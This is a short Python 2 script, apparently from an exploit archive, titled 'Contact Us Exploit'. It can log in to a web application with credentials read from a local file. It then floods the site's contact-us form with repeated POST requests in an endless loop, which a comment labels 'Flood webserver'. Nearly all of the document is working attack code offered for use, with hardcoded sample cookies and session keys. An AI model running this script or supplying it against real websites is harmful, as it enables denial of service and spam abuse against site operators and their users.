#!/usr/bin/Python

#Web Application Logic Exploitation
#Contact Us Exploit
#Coded by Yehia Mamdouh
#Release Date 04-01-2017

import requests
import json
import time


#Headers 

headers = {'Host': 'localhost',
           'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30',
           'Accept-Encoding' : 'gzip, deflate',
           'Cookie' : 'TS01522320=015ff41b7c18581b17910d0df4562adc7cfc858c5513cf6545b3ae11b08b7bddff8526c8de; WSS_FullScreenMode=false; ASP.NET_SessionId=r3d1xag1akqaus0wsmxocrts'}

#Authentication part -- (if not required delete it)
ur = 'URL Here - Auth Page '
text2_file = open ('/root/Downloads/auth.txt', 'r')
lines2 = text2_file.readlines()
dat = lines2
rs = requests.post(ur, data=json.dumps(dat), headers=headers)
print rs.status_code 


#Flood webserver 
url = 'URL HERE - Contact us page'

text1_file = open ('/root/Downloads/event.txt', 'r')
lines1 = text1_file.readlines()

data = {'ctl00%24ScriptManager' : lines1}


params = {'sessionKey': 'b8086a8vn2688g91rt6v1df4b1', 'format': 'xml', 'platformId': 1}

try:
        settimes = raw_input("Set Timeout ")
        while(True):
                time.sleep(int (settimes))
                rr = requests.post(url, params=params,  data=json.dumps(data), headers=headers)
                print rr.status_code
                print rr.content
                count = 0
                while (count < 9):
                        print  'Poc', count , rr
                        count = count + 1
except KeyboardInterrupt:
        print "That is the proof"
        


